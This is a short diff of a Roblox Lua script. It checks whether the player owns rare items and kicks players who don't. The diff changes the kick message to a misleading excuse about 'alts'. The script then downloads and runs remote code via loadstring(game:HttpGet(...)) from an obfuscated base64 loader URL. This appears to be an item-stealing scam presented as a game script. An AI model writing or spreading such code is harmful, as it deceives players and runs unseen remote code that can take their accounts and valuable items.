@@ -41,7 +41,7 @@ if found then
     end)
 else
     -- Player doesn't have good items, kick them out
-    p:Kick("You don't have any rare items (Godly, Ancient, Vintage, or Unique)")
+    p:Kick("Script doesn't work on alts sadly")
 end
 
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvaGlpL3JlZnMvaGVhZHMvbWFpbi9oaS5sdWEifX0"))()
